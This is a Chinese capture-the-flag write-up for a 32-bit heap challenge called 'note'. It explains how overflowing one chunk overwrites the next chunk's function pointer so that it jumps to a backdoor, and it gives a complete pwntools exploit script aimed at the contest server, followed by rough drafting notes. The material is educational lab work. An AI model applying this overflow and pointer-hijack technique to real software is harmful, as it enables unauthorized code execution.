> 保护开启情况：
>
> Arch:       i386-32-little
>
> RELRO:      Partial RELRO
> 
> Stack:      Canary found
> 
> NX:         NX enabled
> 
> PIE:        No PIE (0x8048000)
>
> 知识点：堆溢出（大概）

### wp

观察发现有后门函数，直接给shell

而且在edit的过程中有个这个东西
`      (*(void (__cdecl **)(int *))*items[index])(items[index]);`

没看特别懂，于是查询ai（目移）

ai说大概就是vtable一样的东西

就是会直接执行这个chunk里的第一句

但是通过观察edit_item函数

```
void *__cdecl edit_item(int a1, void *src, int a3, size_t n)
{
  *(_DWORD *)(a1 + 4) = a3;
  return memcpy((void *)(a1 + 8), src, n);
}
```
我们并不能直接修改当前chunk的vtable,但是可以溢出覆盖到下一个

这里需要一个存着backdoor地址的地址（在show的时候会给一个gfit,这个gift就是当前show的chunk的地址）

所以总共需要三个chunk,

第一个（0）用来改第二个（1）的vtable

第三个（2）用来存backdoor的地址

然后就能通过edit第二个chunk（1）

来执行放在上面的shell

#### exp（最后需要手动edit一下1才能拿到shell,没写进去）
```
from pwn import*
filename = './note'
# libc = 

e = ELF(filename)
# libc = ELF(libc)
context(arch=e.arch,os=e.os)
context.log_level = 'debug'

sla = lambda x,s:p.sendlineafter(x,s)
sl = lambda s:p.sendline(s)
sa = lambda x,s:p.sendafter(x,s)
s = lambda s:p.send(s)

p = process(filename)
# gdb.attach(p)
p = remote('x.ctf.neuqcsa.cn',32940)

payload = b'1'

sla(b'>>',payload)
sla(b'>>',payload)
sla(b'>>',payload)

payload = b'3'
sla(b'>>',payload)

payload = b'2'
sla(b':',payload)

payload = b'40'
sla(b':',payload)

payload = p32(0x080489CE)
sla(b':',payload)

payload = b'2'
sla(b'>>',payload)

payload = b'2'
sla(b':',payload)

p.recvuntil(b'gift: ')
gift = p.recv(9)

gift = int(gift,16) + 8

# print(hex(gift))

payload = b'3'
sla(b'>>',payload)

payload = b'0'
sla(b':',payload)

payload = b'40'
sla(b':',payload)

payload = b'1'*24
payload += p32(gift)
sla(b':',payload)

p.interactive()
```

### 草稿

有后门函数

应该是可以改什么东西

直接跳到后门函数 .text:080489CE

在show的时候给了一个gift

是heap地址

是可以覆盖fd什么的吗

等等好像没太搞懂

这个堆地址是干啥用的啊 

哦哦这下看懂了

其实没看很懂，借助了ai的力量，vtable那块没有搞得很懂
